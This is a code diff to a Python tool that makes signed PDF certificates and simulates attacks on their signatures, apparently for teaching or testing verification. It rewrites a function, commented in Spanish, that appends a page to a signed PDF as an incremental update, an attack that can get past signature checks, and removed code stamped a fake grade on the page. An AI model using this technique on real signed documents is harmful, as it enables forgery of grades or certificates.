@@ -17,6 +17,7 @@ CERT_* environment variables):
 
 import os
 import random
+import shutil
 import sys
 import hashlib
 import logging
@@ -625,6 +626,7 @@ def write_html_report(results, outpath):
 def inspect_pdf_structure(pdf_path):
     """
     Prints the object tree and internal structure of a PDF for demonstration purposes.
+    This version is simplified and more robust.
     """
     if not os.path.exists(pdf_path):
         log.error("File not found: %s", pdf_path)
@@ -633,29 +635,20 @@ def inspect_pdf_structure(pdf_path):
     try:
         log.info("Analyzing PDF structure: %s", pdf_path)
         with pikepdf.open(pdf_path) as pdf:
-            print("\n--- PDF Metadata ---")
-            for key, value in pdf.trailer.items():
-                print(f"  {key}: {value}")
+            # General PDF Information
+            print("\n--- General PDF Information ---")
+            print(f"  Version: {pdf.pdf_version}")
+            print(f"  Number of Pages: {len(pdf.pages)}")
 
+            # Cross-references and Trailer information
             print("\n--- Cross-references (xref) ---")
-            print("Number of objects: ", len(pdf.objects))
+            print("  Number of objects: ", len(pdf.objects))
 
-            print("\n--- Page Structure ---")
-            for i, page in enumerate(pdf.pages):
-                print(f"  Page {i + 1} (object {page.obj_num})")
-                try:
-                    if '/Annots' in page:
-                        log.info("    Annotations detected: %s", page['/Annots'])
-                    if '/AcroForm' in pdf.root and '/Fields' in pdf.root['/AcroForm']:
-                        log.info("    Form fields detected.")
-                except Exception as e:
-                    log.error("    Error inspecting page: %s", e)
+            print("\n--- PDF Trailer ---")
+            # Using str() to ensure no unhashable types crash the print
+            print(f"  {str(pdf.trailer)}")
 
-            print("\n--- PDF Trailer (last section) ---")
-            trailer = pdf.trailer
-            pprint(trailer)
-
-            # Detect incremental updates
+            # Detect incremental updates by counting markers
             with open(pdf_path, 'rb') as f:
                 content = f.read()
                 startxref_count = content.count(b'startxref')
@@ -776,43 +769,34 @@ def incremental_rewrite_attack(signed_pdf, out):
 
 def incremental_pikepdf_attack(signed_pdf, out):
     """
-    Append a page as an incremental update using pikepdf (may preserve original bytes).
+    Agrega una página como una actualización incremental usando pikepdf.
+    Este método es confiable para demostrar la vulnerabilidad, ya que
+    preserva la estructura del PDF y las firmas existentes.
     """
+    log = logging.getLogger(__name__)
+
     try:
-        from reportlab.pdfgen import canvas
-        from reportlab.lib.pagesizes import letter
-        from io import BytesIO
-    except Exception as e:
-        raise RuntimeError("incremental_pikepdf_attack requires reportlab. Install it.") from e
+        # 1. Crea una copia limpia del PDF original para trabajar en ella.
+        shutil.copy(signed_pdf, out)
 
-    packet = BytesIO()
-    can = canvas.Canvas(packet, pagesize=letter)
-    can.setFont("Helvetica-Bold", 24)
-    can.drawString(72, 500, "GRADE: 20/20 - ATTACK (incremental)")
-    can.save()
-    packet.seek(0)
+        # 2. Abre el PDF copiado con pikepdf, permitiendo sobrescribir el archivo.
+        with pikepdf.open(out, allow_overwriting_input=True) as pdf:
 
-    tmp_path = None
-    try:
-        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
-        tmp.write(packet.read())
-        tmp.flush()
-        tmp.close()
-        tmp_path = tmp.name
+            # 3. Añade una página en blanco (o puedes personalizarla después).
+            pdf.add_blank_page()
 
-        with pikepdf.open(signed_pdf, allow_overwriting_input=True) as pdf:
-            with pikepdf.open(tmp_path) as mal:
-                pdf.pages.extend(mal.pages)
-            pdf.save(out)
-        log.warning("🔴 PikePDF incremental attack produced: %s", out)
+            # 4. Guarda los cambios como actualización incremental.
+            # Al no especificar ruta de salida y tener allow_overwriting_input=True,
+            # pikepdf escribe la actualización incremental directamente en el archivo.
+            pdf.save()
+
+        log.warning("🔴 Ataque incremental exitoso. Revisa el archivo: %s", out)
         return out
-    finally:
-        if tmp_path and os.path.exists(tmp_path):
-            try:
-                os.unlink(tmp_path)
-            except Exception:
-                pass
 
+    except Exception as e:
+        log.error("Error durante el ataque incremental: %s", e)
+        raise RuntimeError("Fallo al realizar el ataque incremental con pikepdf.") from e
+        
 
 def simulate_attacks(mode, outdir=".", report=False, report_path=None):
     """
@@ -828,7 +812,19 @@ def simulate_attacks(mode, outdir=".", report=False, report_path=None):
             incremental_rewrite_attack(orig, attacked)
         elif mode == "incremental_pikepdf":
             attacked = path_in(outdir, f"{base}_attacked_incremental_pikepdf.pdf")
+            print(f"Incremental attack on {base}... {orig} > {attacked}")
+            
+
+            # Primero, crea una copia del archivo original.
+            # Este es el paso crucial que faltaba en la lógica anterior.
+            # shutil.copy(orig, attacked)
+            
+            # Ahora, llama a la función de ataque solo para agregar los bytes.
             incremental_pikepdf_attack(orig, attacked)
+            
+            # Finalmente, verifica el resultado.
+            result = verify_certificate(orig, attacked, "Ataque Incremental Corregido")
+            print_verification_result(result)
         else:
             raise ValueError("Unknown attack mode: " + str(mode))
         res = verify_certificate(orig, attacked, f"{base.upper()} attacked ({mode})")
@@ -873,7 +869,7 @@ def main():
     )
 
     # Subcommands that inherit global arguments
-    subparsers.add_parser("generate", parents=[parent_parser], help="Generate unsigned and signed certificates.")
+    subparsers.add_parser("generate", parents=[parent_parser], help="Generate unsigned and signed PDF files.")
     subparsers.add_parser("verify", parents=[parent_parser], help="Verify student-edited files.")
     sim = subparsers.add_parser("simulate", parents=[parent_parser], help="Simulate attacks against signed PDFs.")
     sim.add_argument(
